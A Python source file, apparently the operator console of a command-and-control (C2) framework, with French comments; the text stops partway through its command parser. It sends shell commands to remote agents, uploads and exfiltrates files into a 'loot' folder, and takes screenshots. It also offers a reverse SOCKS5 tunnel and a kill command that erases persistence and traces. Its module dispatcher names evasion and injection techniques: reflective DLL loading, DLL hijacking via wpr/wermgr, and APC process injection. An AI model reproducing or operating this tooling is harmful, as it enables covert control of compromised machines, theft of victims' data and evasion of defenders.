# ============================================================
#  operator/commands.py
# ============================================================

import time
import requests
import getpass
import os
import base64
from typing import Optional

from display import (
    print_agents_table, print_agent_info, print_results,
    print_history_table, print_events, print_sessions_table,
    print_stats, print_result_detail, print_help,
    print_loot_table
)


class CommandHandler:

    POLL_INTERVAL  = 0.5   # secondes entre chaque vérif résultat
    RESULT_TIMEOUT = 60    # secondes max avant abandon

    def __init__(self, server_url: str):
        self.server_url    = server_url.rstrip("/")
        self.session       = requests.Session()
        self.token         = None
        self.operator_name = None
        self.focused_agent = None

    def set_credentials(self, token: str, operator_name: str):
        self.token         = token
        self.operator_name = operator_name
        self.session.headers.update({"session-token": token})

    def clear_credentials(self):
        self.token         = None
        self.operator_name = None
        self.focused_agent = None
        self.session.headers.pop("session-token", None)

    def get_prompt(self) -> str:
        if not self.operator_name:
            return "> "
        base = f"[{self.operator_name}]"
        if self.focused_agent:
            return f"{base}[{self.focused_agent}]> "
        try:
            resp = self.session.get(f"{self.server_url}/operator/agents", timeout=2)
            if resp.status_code == 200:
                online = resp.json().get("online", 0)
                return f"{base}[{online} online]> "
        except:
            pass
        return f"{base}> "

    # ── Authentification ──────────────────────────────────────

    def cmd_login(self, operator_name: str) -> bool:
        """
        Authentification avec mot de passe caché.
        Premier login: crée compte avec ce mot de passe.
        Login suivant: vérifie mot de passe contre hash stocké.
        """
        try:
            password = getpass.getpass("  Password: ")   # hidden input, no echo
            
            resp = self.session.post(
                f"{self.server_url}/operator/login",
                json={"operator_name": operator_name, "password": password},
                timeout=5
            )
            if resp.status_code == 200:
                data = resp.json()
                self.set_credentials(data["token"], data["operator_name"])
                print(f"[✓] {data['message']}: {data['operator_name']}")
                return True
            elif resp.status_code == 401:
                print(f"[✗] {resp.json().get('detail', 'Erreur d\'authentification')}")
                return False
            else:
                print(f"[✗] Échec de connexion: {resp.text}")
                return False
        except requests.exceptions.ConnectionError:
            print(f"[✗] Serveur inaccessible: {self.server_url}")
            return False
        except Exception as e:
            print(f"[✗] Erreur: {e}")
            return False

    def cmd_logout(self):
        if not self.token:
            print("[!] Non connecté")
            return
        try:
            self.session.post(f"{self.server_url}/operator/logout", timeout=5)
        except:
            pass
        self.clear_credentials()
        print("[✓] Déconnecté")

    # ── Agents ────────────────────────────────────────────────

    def cmd_list(self):
        if not self._check_auth():
            return
        try:
            resp = self.session.get(f"{self.server_url}/operator/agents", timeout=5)
            if resp.status_code == 200:
                print_agents_table(resp.json())
            else:
                print(f"[✗] Erreur: {resp.status_code}")
        except Exception as e:
            print(f"[✗] Erreur réseau: {e}")

    def cmd_use(self, agent_id: str) -> Optional[str]:
        if not self._check_auth():
            return None
        try:
            resp = self.session.get(
                f"{self.server_url}/operator/agent/{agent_id}", timeout=5
            )
            if resp.status_code == 200:
                self.focused_agent = agent_id
                print(f"[✓] Mode focus sur agent {agent_id}")
                print(f"[i] Toutes les commandes iront à cet agent")
                print(f"[i] Tape 'back' pour revenir au mode normal\n")
                return agent_id
            else:
                print(f"[✗] Agent inconnu: {agent_id}")
                return None
        except Exception as e:
            print(f"[✗] Erreur: {e}")
            return None

    def cmd_back(self):
        if self.focused_agent:
            print(f"[i] Sortie du mode focus ({self.focused_agent})")
            self.focused_agent = None
        else:
            print("[!] Pas en mode focus")

    def cmd_info(self, agent_id: Optional[str] = None):
        if not self._check_auth():
            return
        target = agent_id or self.focused_agent
        if not target:
            print("[!] Spécifiez un agent_id ou utilisez 'use <agent_id>'")
            return
        try:
            resp = self.session.get(
                f"{self.server_url}/operator/agent/{target}", timeout=5
            )
            if resp.status_code == 200:
                print_agent_info(resp.json())
            else:
                print(f"[✗] Agent inconnu: {target}")
        except Exception as e:
            print(f"[✗] Erreur: {e}")

    # ── Commande interactive ──────────────────────────────────

    def cmd_send(self, command: str, agent_id: Optional[str] = None):
        """
        Envoie une commande ET attend le résultat dans le même terminal.
        1. POST /operator/command  → task_id
        2. Poll GET /operator/result/{task_id} toutes les 0.5s
        3. Résultat → affiche ici même et retourne au prompt
        """
        if not self._check_auth():
            return

        target = agent_id or self.focused_agent
        if not target:
            print("[!] Spécifiez un agent_id ou utilisez 'use <agent_id>'")
            return

        # ── Étape 1 : envoyer la commande ─────────────────────
        try:
            resp = self.session.post(
                f"{self.server_url}/operator/command",
                json={
                    "agent_id":      target,
                    "command":       command,
                    "session_token": self.token,
                    "module":        "shell",
                    "file_data":     "",
                },
                timeout=5
            )
        except requests.exceptions.ConnectionError:
            print("[✗] Serveur inaccessible")
            return
        except Exception as e:
            print(f"[✗] Erreur réseau: {e}")
            return

        if resp.status_code == 401:
            print("[✗] Session invalide ou expirée")
            return
        elif resp.status_code == 404:
            print(f"[✗] Agent '{target}' introuvable")
            return
        elif resp.status_code != 200:
            print(f"[✗] Erreur serveur: {resp.text}")
            return

        task_id = resp.json().get("task_id", "?")
        print(f"  [→] task: {task_id}  en attente", end="", flush=True)

        # ── Étape 2 : poll jusqu'au résultat ──────────────────
        start = time.time()

        while True:
            elapsed = time.time() - start

            if elapsed > self.RESULT_TIMEOUT:
                print(f"\n  [✗] Timeout après {self.RESULT_TIMEOUT}s — agent hors ligne ?")
                print(f"  [!] Récupère le résultat plus tard : result {task_id}\n")
                return

            print(".", end="", flush=True)
            time.sleep(self.POLL_INTERVAL)

            try:
                r = self.session.get(
                    f"{self.server_url}/operator/result/{task_id}",
                    timeout=5
                )
            except requests.exceptions.RequestException:
                continue

            if r.status_code == 404:
                continue   # pas encore disponible → retry

            if r.status_code == 200:
                # ── Étape 3 : afficher le résultat ────────────
                data   = r.json()
                result = data.get("result", {})
                output = result.get("output", "").rstrip()
                status = result.get("status", "?")
                icon   = "✓" if status == "success" else "✗"

                print()
                print(f"  {'─' * 58}")
                for line in output.split("\n"):
                    print(f"  {line}")
                print(f"  {'─' * 58}")
                print(f"  [{icon}] {status.upper()}  ·  reçu en {elapsed:.1f}s\n")
                return

    def _send_module(self, agent_id: str, command: str, module: str, label: str,
                     technique: str = "rdll"):
        """
        Envoie une commande avec un module spécifique (sysinfo, etc.)
        et attend le résultat — réutilise la logique de cmd_send.
        Technique par défaut: rdll (BOF actuellement désactivé).
        """
        if not self._check_auth():
            return
        try:
            resp = self.session.post(
                f"{self.server_url}/operator/command",
                json={
                    "agent_id":      agent_id,
                    "command":       command,
                    "session_token": self.token,
                    "module":        module,
                    "file_data":     "",
                    "technique":     technique,
                },
                timeout=5
            )
        except Exception as e:
            print(f"[✗] Erreur réseau: {e}")
            return

        if resp.status_code != 200:
            print(f"[✗] Erreur: {resp.text}")
            return

        task_id = resp.json().get("task_id", "?")
        print(f"  [→] {label}: {task_id}  en attente", end="", flush=True)
        start = time.time()

        while True:
            elapsed = time.time() - start
            if elapsed > self.RESULT_TIMEOUT:
                print(f"\n  [✗] Timeout — récupère plus tard : result {task_id}\n")
                return
            print(".", end="", flush=True)
            time.sleep(self.POLL_INTERVAL)
            try:
                r = self.session.get(f"{self.server_url}/operator/result/{task_id}", timeout=5)
            except Exception:
                continue
            if r.status_code == 200:
                result = r.json().get("result", {})
                output = result.get("output", "").rstrip()
                status = result.get("status", "?")
                icon   = "✓" if status == "success" else "✗"
                print()
                print(f"  {'─' * 58}")
                for line in output.split("\n"):
                    print(f"  {line}")
                print(f"  {'─' * 58}")
                print(f"  [{icon}] {status.upper()}  ·  reçu en {elapsed:.1f}s\n")
                return

    # ── Résultats / historique ────────────────────────────────

    def cmd_results(self, all_sessions: bool = False):
        if not self._check_auth():
            return
        try:
            params = {"all_sessions": all_sessions} if all_sessions else {}
            resp = self.session.get(
                f"{self.server_url}/operator/results",
                params=params,
                timeout=5
            )
            if resp.status_code == 200:
                data = resp.json()
                if all_sessions:
                    print(f"[i] Affichage de {data['total']} résultats de TOUS les sessions")
                print_results(data)
            else:
                print(f"[✗] Erreur: {resp.status_code}")
        except Exception as e:
            print(f"[✗] Erreur: {e}")

    def cmd_result(self, task_id: str):
        if not self._check_auth():
            return
        try:
            resp = self.session.get(
                f"{self.server_url}/operator/result/{task_id}", timeout=5
            )
            if resp.status_code == 200:
                print_result_detail(resp.json())
            else:
                print(f"[✗] Résultat non trouvé: {task_id}")
        except Exception as e:
            print(f"[✗] Erreur: {e}")

    def cmd_history(self, all_sessions: bool = False):
        if not self._check_auth():
            return
        try:
            params = {"all_sessions": all_sessions} if all_sessions else {}
            resp = self.session.get(
                f"{self.server_url}/operator/history",
                params=params,
                timeout=5
            )
            if resp.status_code == 200:
                data = resp.json()
                if all_sessions:
                    print(f"[i] Affichage de {data['total']} tâches de TOUS les sessions")
                print_history_table(data)
            else:
                print(f"[✗] Erreur: {resp.status_code}")
        except Exception as e:
            print(f"[✗] Erreur: {e}")

    def cmd_events(self, agent_id: Optional[str] = None):
        if not self._check_auth():
            return
        try:
            params = {"agent_id": agent_id} if agent_id else {}
            resp = self.session.get(
                f"{self.server_url}/operator/events", params=params, timeout=5
            )
            if resp.status_code == 200:
                print_events(resp.json())
            else:
                print(f"[✗] Erreur: {resp.status_code}")
        except Exception as e:
            print(f"[✗] Erreur: {e}")

    def cmd_sessions(self):
        if not self._check_auth():
            return
        try:
            resp = self.session.get(f"{self.server_url}/operator/sessions", timeout=5)
            if resp.status_code == 200:
                print_sessions_table(resp.json())
            else:
                print(f"[✗] Erreur: {resp.status_code}")
        except Exception as e:
            print(f"[✗] Erreur: {e}")

    def cmd_stats(self):
        if not self._check_auth():
            return
        try:
            resp = self.session.get(f"{self.server_url}/operator/stats", timeout=5)
            if resp.status_code == 200:
                print_stats(resp.json())
            else:
                print(f"[✗] Erreur: {resp.status_code}")
        except Exception as e:
            print(f"[✗] Erreur: {e}")

    def cmd_upload(self, local_file: str, remote_path: str):
        """Upload un fichier local vers l'agent."""
        if not self._check_auth():
            return
        if not self.focused_agent:
            print("[!] Mode focus requis. Utilisez: use <agent_id>")
            return
        
        try:
            # Vérifie que le fichier local existe
            if not os.path.exists(local_file):
                print(f"[✗] Fichier introuvable: {local_file}")
                return
            
            # Lit le fichier et l'encode en base64
            with open(local_file, 'rb') as f:
                file_content = f.read()
            
            # Vérifie la taille (limite 50MB)
            file_size = len(file_content)
            max_size = 50 * 1024 * 1024  # 50MB
            
            if file_size > max_size:
                print(f"[✗] Fichier trop volumineux: {file_size} bytes (max: {max_size} bytes)")
                return
            
            # Avertissement si > 10MB
            if file_size > 10 * 1024 * 1024:
                print(f"[AVERTISSEMENT] Fichier volumineux: {file_size} bytes")
            
            # Encode en base64
            encoded_content = base64.b64encode(file_content).decode('utf-8')

            filename = os.path.basename(local_file)
            dest     = remote_path

            # Normalise la destination :
            # "."  → remplace par le nom du fichier (dossier courant de l'agent)
            # Fin en \ ou / → ajoute le nom du fichier (dossier explicite)
            # Pas d'extension dans le dernier composant → probablement un dossier
            #   → ajoute aussi le nom du fichier (heuristique)
            if dest in ('.', './', '.\\'):
                dest = filename
            elif dest.endswith('/') or dest.endswith('\\'):
                dest = dest + filename
            else:
                remote_basename = os.path.basename(dest.replace('\\', '/'))
                if '.' not in remote_basename:
                    # Dernier composant sans extension → dossier probable
                    sep = '\\' if '\\' in dest else '/'
                    dest = dest.rstrip('\\/') + sep + filename

            # Envoie la commande d'upload.
            # Le champ "filename" permet à l'agent de gérer les cas résiduels
            # où dest est un dossier qu'il peut détecter avec GetFileAttributesA.
            resp = self.session.post(
                f"{self.server_url}/operator/command",
                json={
                    "agent_id":      self.focused_agent,
                    "command":       f"upload {dest}",
                    "session_token": self.token,
                    "module":        "upload",
                    "file_data":     encoded_content,
                    "filename":      filename,
                    "technique":     "rdll",
                },
                timeout=5
            )

            if resp.status_code == 200:
                task_id = resp.json().get("task_id", "?")
                print(f"[✓] Upload en cours: task {task_id}")
                print(f"[i] Fichier: {local_file} ({file_size} bytes)")
                print(f"[i] Destination agent: {dest}")
            else:
                print(f"[✗] Erreur: {resp.status_code}")
                
        except Exception as e:
            print(f"[✗] Erreur: {e}")

    def cmd_download(self, remote_path: str, local_path: str = None):
        """
        Télécharge un fichier depuis l'agent et le sauvegarde localement.
        1. Envoie la commande download → l'agent lit le fichier et retourne son contenu en base64
        2. Décode le base64 et écrit le fichier dans loot/<agent_id>/ (ou local_path si spécifié)
        """
        if not self._check_auth():
            return
        if not self.focused_agent:
            print("[!] Mode focus requis. Utilisez: use <agent_id>")
            return

        try:
            # Envoie la commande de download
            resp = self.session.post(
                f"{self.server_url}/operator/command",
                json={
                    "agent_id":      self.focused_agent,
                    "command":       f"download {remote_path}",
                    "session_token": self.token,
                    "module":        "download",
                    "file_data":     "",
                    "technique":     "rdll",
                },
                timeout=5
            )
            if resp.status_code != 200:
                print(f"[✗] Erreur: {resp.status_code} — {resp.text}")
                return

            task_id     = resp.json().get("task_id", "?")
            remote_name = os.path.basename(remote_path.replace('\\', '/'))
            print(f"  [→] download {remote_name}: {task_id}  en attente", end="", flush=True)

            # Attend le résultat
            start = time.time()
            while True:
                elapsed = time.time() - start
                if elapsed > self.RESULT_TIMEOUT:
                    print(f"\n  [✗] Timeout après {self.RESULT_TIMEOUT}s\n")
                    return

                print(".", end="", flush=True)
                time.sleep(self.POLL_INTERVAL)

                try:
                    r = self.session.get(
                        f"{self.server_url}/operator/result/{task_id}", timeout=5
                    )
                except requests.exceptions.RequestException:
                    continue

                if r.status_code == 404:
                    continue

                if r.status_code == 200:
                    result = r.json().get("result", {})
                    output = result.get("output", "")
                    status = result.get("status", "?")
                    print()

                    if status != "success" or not output:
                        print(f"  [✗] {output or 'Aucune donnée reçue'}")
                        return

                    # Le serveur a déjà intercepté et sauvegardé le fichier :
                    # il remplace l'output base64 par "[FILE] Saved → ..."
                    # Ce préfixe contient un caractère non-ASCII (→) qui fait
                    # échouer base64.b64decode → on détecte ce cas et on affiche.
                    if output.startswith("[FILE]") or output.startswith("[ERROR]"):
                        print(f"  {'─' * 58}")
                        print(f"  {output}")
                        print(f"  {'─' * 58}")
                        print(f"  [✓] SUCCESS  ·  reçu en {elapsed:.1f}s\n")
                        return

                    # Cas normal : l'output est du base64 brut, on le décode
                    try:
                        file_bytes = base64.b64decode(output)
                    except Exception as e:
                        print(f"  [✗] Décodage base64 échoué: {e}")
                        return

                    # Détermine le chemin de sauvegarde local
                    if local_path:
                        save_path = local_path
                    else:
                        loot_dir = os.path.join("loot", self.focused_agent)
                        os.makedirs(loot_dir, exist_ok=True)
                        save_path = os.path.join(loot_dir, remote_name)

                    with open(save_path, 'wb') as f:
                        f.write(file_bytes)

                    size = len(file_bytes)
                    size_str = (f"{size / (1024*1024):.1f} MB" if size >= 1024*1024
                                else f"{size / 1024:.1f} KB" if size >= 1024
                                else f"{size} bytes")

                    print(f"  {'─' * 58}")
                    print(f"  [✓] Fichier sauvegardé : {os.path.abspath(save_path)}")
                    print(f"  [i] Taille             : {size_str}")
                    print(f"  [i] Source (agent)     : {remote_path}")
                    print(f"  {'─' * 58}")
                    print(f"  [✓] SUCCESS  ·  reçu en {elapsed:.1f}s\n")
                    return

        except Exception as e:
            print(f"[✗] Erreur: {e}")

    def cmd_enum(self, args: list):
        """
        Énumération de la cible via le module BOF 'enum'.

        Syntaxe :
          enum                  → rapport complet (all)
          enum getuid           → nom d'utilisateur courant
          enum hostname         → nom machine
          enum domain           → domaine / WORKGROUP
          enum getpid           → PID du processus agent
          enum getintegrity     → niveau d'intégrité (Low/Medium/High/System)
          enum drives           → lecteurs, type, espace libre/total
          enum uptime           → temps de fonctionnement système
          enum all              → tout (idem à enum sans argument)
        """
        if not self._check_auth():
            return

        target = self.focused_agent

        # Premier arg peut être un agent_id (8 chars hex) ou une sous-commande
        sub = "all"
        remaining = list(args)

        if remaining:
            first = remaining[0]
            if len(first) == 8 and all(c in "0123456789abcdef" for c in first.lower()):
                target    = first
                remaining = remaining[1:]
            # sous-commande
            if remaining:
                sub = remaining[0].lower()

        if not target:
            print("[!] Mode focus requis ou spécifier agent_id")
            print("    Usage: enum [agent_id] [getuid|hostname|domain|getpid|getintegrity|drives|uptime|all]")
            return

        valid = {"whoami", "getuid", "hostname", "domain", "getpid",
                 "getintegrity", "drives", "uptime", "all"}
        if sub not in valid:
            print(f"[!] Sous-commande inconnue : '{sub}'")
            print(f"    Valides : {' | '.join(sorted(valid))}")
            return

        self._send_dynamic_module(target, "enum", "bof",
                                  sub, f"enum/{sub}")

    def cmd_process_list(self, agent_id: str = None):
        """
        Énumère les processus en cours d'exécution sur l'agent.
        Retourne un tableau JSON : [{"pid":N,"name":"...","path":"..."}, ...]
        Utilise CreateToolhelp32Snapshot (Windows) ou /proc (Linux).
        """
        if not self._check_auth():
            return
        target = agent_id or self.focused_agent
        if not target:
            print("[!] Mode focus requis ou spécifier agent_id")
            print("    Usage: ps [agent_id]  OU  use <id> puis ps")
            return
        self._send_module(target, "process_list", "process_list", "process_list")

    def cmd_kill(self, agent_id: str = None):
        """
        Termine proprement l'agent et efface ses traces.
        Séquence côté agent :
          1. Envoie ce résultat au serveur
          2. Supprime la persistance (Run key / crontab)
          3. Supprime .agent_id
          4. Planifie la suppression du binaire
          5. exit(0)
        AVERTISSEMENT : cette commande est irréversible.
        L'agent ne répondra plus après réception.
        """
        if not self._check_auth():
            return
        target = agent_id or self.focused_agent
        if not target:
            print("[!] Mode focus requis ou spécifier agent_id")
            print("    Usage: kill [agent_id]  OU  use <id> puis kill")
            return
        # Confirmation de sécurité
        confirm = input(f"  [!] Terminer l'agent {target} de manière irréversible ? [y/N] ")
        if confirm.strip().lower() != 'y':
            print("  [i] Annulé")
            return
        print(f"  [→] Envoi de la commande kill à {target}...")
        self._send_module(target, "kill", "kill", "kill")

    def cmd_screenshot(self, agent_id: str = None):
        """
        Capture l'écran de l'agent.
        L'agent capture en mémoire et uploade directement via /agent/upload
        (pattern chunked upload — aucune limite de taille, aucun fichier tmp).
        L'opérateur attend juste la confirmation de fin de transfert.
        """
        if not self._check_auth():
            return

        target = agent_id or self.focused_agent
        if not target:
            print("[!] Mode focus requis ou spécifier agent_id")
            return

        try:
            resp = self.session.post(
                f"{self.server_url}/operator/command",
                json={
                    "agent_id":      target,
                    "command":       "screenshot",
                    "session_token": self.token,
                    "module":        "screenshot",
                    "file_data":     "",
                    "technique":     "rdll",
                },
                timeout=5
            )
        except Exception as e:
            print(f"[✗] Erreur réseau: {e}")
            return

        if resp.status_code != 200:
            print(f"[✗] Erreur: {resp.text}")
            return

        task_id = resp.json().get("task_id", "?")
        print(f"  [→] screenshot: {task_id}  en attente", end="", flush=True)

        start = time.time()
        while True:
            elapsed = time.time() - start
            if elapsed > self.RESULT_TIMEOUT:
                print(f"\n  [✗] Timeout après {self.RESULT_TIMEOUT}s\n")
                return

            print(".", end="", flush=True)
            time.sleep(self.POLL_INTERVAL)

            try:
                r = self.session.get(
                    f"{self.server_url}/operator/result/{task_id}", timeout=5
                )
            except Exception:
                continue

            if r.status_code == 404:
                continue

            if r.status_code == 200:
                result = r.json().get("result", {})
                output = result.get("output", "").rstrip()
                status = result.get("status", "?")
                icon   = "✓" if status == "success" else "✗"
                print()
                print(f"  {'─' * 58}")
                for line in output.split('\n'):
                    if line.strip():
                        print(f"  {line.strip()}")
                print(f"  {'─' * 58}")
                print(f"  [{icon}] {status.upper()}  ·  {elapsed:.1f}s\n")
                return

    def cmd_loot(self, agent_id: str):
        """Affiche les fichiers téléchargés d'un agent."""
        if not self._check_auth():
            return
        
        try:
            if agent_id == "all":
                # Affiche tous les loot de tous les agents
                resp = self.session.get(f"{self.server_url}/operator/agents", timeout=5)
                if resp.status_code == 200:
                    agents = resp.json().get("agents", [])
                    for agent in agents:
                        agent_id = agent["id"]
                        loot_resp = self.session.get(
                            f"{self.server_url}/operator/loot/{agent_id}",
                            timeout=5
                        )
                        if loot_resp.status_code == 200:
                            loot_data = loot_resp.json()
                            if loot_data["total"] > 0:
                                print(f"\n[LOOT] Agent {agent_id}:")
                                print_loot_table(loot_data)
            else:
                # Affiche le loot d'un agent spécifique
                resp = self.session.get(f"{self.server_url}/operator/loot/{agent_id}", timeout=5)
                if resp.status_code == 200:
                    print_loot_table(resp.json())
                else:
                    print(f"[✗] Erreur: {resp.status_code}")
                    
        except Exception as e:
            print(f"[✗] Erreur: {e}")

    def _send_dynamic_module(self, agent_id: str, module: str, technique: str,
                              command: str = "", label: str = None):
        """
        Envoie un module dynamique (BOF/RDLL/shellcode) à l'agent et attend le résultat.
        Le serveur servira le binaire compilé depuis server/modules/<module>/<module>.<arch>.o
        """
        if not self._check_auth():
            return
        if not label:
            label = f"{module}/{technique}"

        try:
            resp = self.session.post(
                f"{self.server_url}/operator/command",
                json={
                    "agent_id":      agent_id,
                     "command":       command if (command or technique == "apcinject") else module,
                    "session_token": self.token,
                    "module":        module,
                    "file_data":     "",
                    "technique":     technique,
                },
                timeout=5
            )
        except Exception as e:
            print(f"[✗] Erreur réseau: {e}")
            return

        if resp.status_code != 200:
            print(f"[✗] Erreur: {resp.text}")
            return

        task_id = resp.json().get("task_id", "?")
        print(f"  [→] {label}: {task_id}  en attente", end="", flush=True)
        start = time.time()

        while True:
            elapsed = time.time() - start
            if elapsed > self.RESULT_TIMEOUT:
                print(f"\n  [✗] Timeout — récupère plus tard : result {task_id}\n")
                return
            print(".", end="", flush=True)
            time.sleep(self.POLL_INTERVAL)
            try:
                r = self.session.get(
                    f"{self.server_url}/operator/result/{task_id}", timeout=5
                )
            except Exception:
                continue
            if r.status_code == 200:
                result = r.json().get("result", {})
                output = result.get("output", "").rstrip()
                status = result.get("status", "?")
                icon   = "✓" if status == "success" else "✗"
                print()
                print(f"  {'─' * 58}")
                for line in output.split("\n"):
                    print(f"  {line}")
                print(f"  {'─' * 58}")
                print(f"  [{icon}] {status.upper()}  ·  reçu en {elapsed:.1f}s\n")
                return

    def cmd_module(self, parts: list):
        """
        Dispatch un module dynamique avec la technique d'exécution spécifiée.

        Syntaxe :
          module <name> -t <technique> [agent_id] [command_args...]

        Techniques :
          -t rdll       Reflective DLL Loading (T1620)          — défaut, recommandé
          -t rundll32   Signed Binary Proxy (T1218.011)         — via rundll32.exe
          -t wpr        Phantom DLL via wpr.exe (T1574.002)     — requiert admin
          -t wermgr     Phantom DLL via wermgr.exe (T1574.002)  — requiert admin
          -t apc        APC Injection via QueueUserAPC (T1055)  — preuve de concept
          -t apcinject  APC cross-process sur threads distants (T1055.004) — shellcode .bin
          -t bof        COFF/BOF Object File (T1620 COFF)       — archivé
          -t shellcode  sRDI Shellcode in-process (T1059)       — archivé
          -t inject     Process Injection notepad (T1055)       — archivé

        Prérequis :
          rdll / rundll32 / wpr / wermgr : make dll-x64
          wpr / wermgr : token élevé (administrateur) requis

        Exemples :
          module sysinfo     -t rdll
          module sysinfo     -t rundll32
          module sysinfo     -t wpr
          module sysinfo     -t wermgr
          module screenshot  -t rdll
          module screenshot  -t wermgr
          module shell       -t rdll whoami
          module shell       -t rundll32 whoami
          module fileops     -t rdll ls C:\\\\Users
          module calc        -t apcinject                 # APC → notepad.exe (défaut)
          module calc        -t apcinject explorer.exe    # APC → explorer.exe
        """
        if len(parts) < 3:
            print("Usage: module <name> -t <technique> [agent_id] [command_args...]")
            print("  Techniques : rdll | bof | shellcode | inject")
            print("  Exemples   : module screenshot -t rdll")
            print("               module shell -t shellcode whoami")
            print("               module process -t inject")
            return

        module_name = parts[0]
        technique   = ""
        remaining   = list(parts[1:])

        # Extrait -t <technique> de n'importe quelle position
        i = 0
        new_remaining = []
        while i < len(remaining):
            if remaining[i] in ("-t", "--technique") and i + 1 < len(remaining):
                technique = remaining[i + 1]
                i += 2
            else:
                new_remaining.append(remaining[i])
                i += 1
        remaining = new_remaining

        if not technique:
            print("[!] Technique manquante. Utilisez: -t rdll | -t apc | -t apcinject | -t bof | -t shellcode | -t inject")
            return

        valid_techniques = {"rdll", "rundll32", "wpr", "wermgr", "apc", "apcinject", "bof", "shellcode", "inject", "src"}
        if technique not in valid_techniques:
            print(f"[!] Technique inconnue : '{technique}'")
            print(f"    Valeurs valides    : {' | '.join(sorted(valid_techniques))}")
            return

        # Le premier token restant peut être un agent_id (8 chars hex)
        agent_id = None
        cmd_args = remaining
        if remaining and len(remaining[0]) == 8 and all(c in "0123456789abcdef"
                                                         for c in remaining[0].lower()):
            agent_id  = remaining[0]
            cmd_args  = remaining[1:]
        else:
            agent_id = self.focused_agent

        if not agent_id:
            print("[!] Mode focus requis ou spécifier agent_id")
            print("    Usage: module <name> -t <technique> [agent_id] [args...]")
            return

        command = " ".join(cmd_args) if cmd_args else module_name
        # apcinject : le 1er argument BeaconData est le NOM du processus cible.
        # Sans cible explicite → commande vide → apcinject_loader.c utilise
        # son défaut (notepad.exe). Évite de cibler le nom du module lui-même.
        if technique == "apcinject" and not cmd_args:
            command = ""
        self._send_dynamic_module(agent_id, module_name, technique,
                                  command, f"{module_name}/{technique}")

    # ── Tunnel SOCKS5 ─────────────────────────────────────────

    def cmd_tunnel(self, parts: list):
        """
        Gère le tunnel SOCKS5 inversé.

        tunnel start --socks5 :<port>   Démarre le proxy SOCKS5 via l'agent focalisé
        tunnel list                     Liste tous les tunnels actifs
        tunnel show [agent_id]          Détail d'un tunnel
        tunnel stop [agent_id]          Arrête un tunnel
        """
        if not self._check_auth():
            return
        if not parts:
            print("Usage: tunnel start|list|show|stop")
            return

        sub = parts[0].lower()

        if sub == "start":
            self._tunnel_start(parts[1:])
        elif sub == "list":
            self._tunnel_list()
        elif sub == "show":
            target = parts[1] if len(parts) > 1 else self.focused_agent
            if not target:
                print("[!] Spécifiez un agent_id ou utilisez 'use <id>'")
                return
            self._tunnel_show(target)
        elif sub == "stop":
            target = parts[1] if len(parts) > 1 else self.focused_agent
            if not target:
                print("[!] Spécifiez un agent_id ou utilisez 'use <id>'")
                return
            self._tunnel_stop(target)
        else:
            print(f"[!] Sous-commande tunnel inconnue : '{sub}'")
            print("    Valeurs : start | list | show | stop")

    def _tunnel_start(self, args: list):
        target = self.focused_agent
        if not target:
            print("[!] Mode focus requis. Utilisez: use <agent_id>")
            return

        port = 1080
        i = 0
        while i < len(args):
            if args[i] == "--socks5" and i + 1 < len(args):
                port = int(args[i + 1].lstrip(":"))
                i += 2
            else:
                i += 1

        try:
            resp = self.session.post(
                f"{self.server_url}/operator/tunnel/start",
                json={
                    "agent_id":      target,
                    "port":          port,
                    "session_token": self.token,
                },
                timeout=5
            )
        except Exception as e:
            print(f"[✗] Erreur réseau : {e}")
            return

        if resp.status_code == 409:
            print(f"[!] Tunnel déjà actif pour l'agent {target}")
            return
        if resp.status_code != 200:
            print(f"[✗] Erreur : {resp.text}")
            return

        data = resp.json()
        print(f"  [✓] {data['message']}")
        print(f"  [→] task_id : {data['task_id']}")
        print(f"  [i] L'agent va activer le tunnel lors de son prochain poll (~3s)")
        print(f"\n  Utilisation :")
        print(f"    curl --socks5 localhost:{port} http://ifconfig.me")
        print(f"    curl --socks5 localhost:{port} https://example.com")

    def _tunnel_list(self):
        try:
            resp = self.session.get(
                f"{self.server_url}/operator/tunnel/list", timeout=5
            )
        except Exception as e:
            print(f"[✗] Erreur réseau : {e}")
            return

        if resp.status_code != 200:
            print(f"[✗] Erreur : {resp.text}")
            return

        data = resp.json()
        tunnels = data.get("tunnels", [])
        if not tunnels:
            print("[i] Aucun tunnel actif")
            return

        print(f"\n  {'Agent':<10} {'Port':<8} {'Connexions':<12} {'Uptime':<10}")
        print(f"  {'─'*10} {'─'*8} {'─'*12} {'─'*10}")
        for t in tunnels:
            uptime = t['uptime_s']
            if uptime >= 3600:
                up_str = f"{uptime//3600}h{(uptime%3600)//60}m"
            elif uptime >= 60:
                up_str = f"{uptime//60}m{uptime%60}s"
            else:
                up_str = f"{uptime}s"
            print(f"  {t['agent_id']:<10} {t['socks_port']:<8} "
                  f"{t['active_conns']:<12} {up_str:<10}")
        print()

    def _tunnel_show(self, agent_id: str):
        try:
            resp = self.session.get(
                f"{self.server_url}/operator/tunnel/{agent_id}", timeout=5
            )
        except Exception as e:
            print(f"[✗] Erreur réseau : {e}")
            return

        if resp.status_code == 404:
            print(f"[!] Aucun tunnel actif pour l'agent {agent_id}")
            return
        if resp.status_code != 200:
            print(f"[✗] Erreur : {resp.text}")
            return

        data = resp.json()
        print(f"\n  Agent       : {data['agent_id']}")
        print(f"  Port SOCKS5 : {data['socks_port']}")
        print(f"  Uptime      : {data['uptime_s']}s")
        conns = data.get("connections", [])
        if conns:
            print(f"\n  Connexions actives ({len(conns)}) :")
            for c in conns:
                print(f"    [{c['state']:10}] tid={c['tunnel_id']}  "
                      f"age={c['age_s']}s  idle={c['idle_s']}s")
        else:
            print("  Connexions actives : aucune")
        print()

    def _tunnel_stop(self, agent_id: str):
        confirm = input(f"  [!] Arrêter le tunnel de l'agent {agent_id} ? [y/N] ")
        if confirm.strip().lower() != "y":
            print("  [i] Annulé")
            return
        try:
            resp = self.session.delete(
                f"{self.server_url}/operator/tunnel/{agent_id}", timeout=5
            )
        except Exception as e:
            print(f"[✗] Erreur réseau : {e}")
            return

        if resp.status_code == 404:
            print(f"[!] Aucun tunnel pour l'agent {agent_id}")
            return
        if resp.status_code != 200:
            print(f"[✗] Erreur : {resp.text}")
            return

        print(f"  [✓] Tunnel arrêté — task_id : {resp.json().get('task_id')}")

    def cmd_help(self):
        print_help()

    # ── Utilitaires ───────────────────────────────────────────

    def _check_auth(self) -> bool:
        if not self.token:
            print("[!] Non authentifié. Utilisez: login <operator_name>")
            return False
        return True

    def handle(self, line: str) -> bool:
        """
        Parse et exécute une ligne de commande.

        Mode focus actif → toute commande non réservée est envoyée
        directement à l'agent sélectionné ET le résultat s'affiche ici.
        """
        # Parsing robuste : respecte les guillemets ET les backslashes Windows.
        # Regex : capture soit "texte entre guillemets" soit un token sans espaces.
        import re
        raw = re.findall(r'"([^"]*)"|(\'[^\']*\')|(\S+)', line.strip())
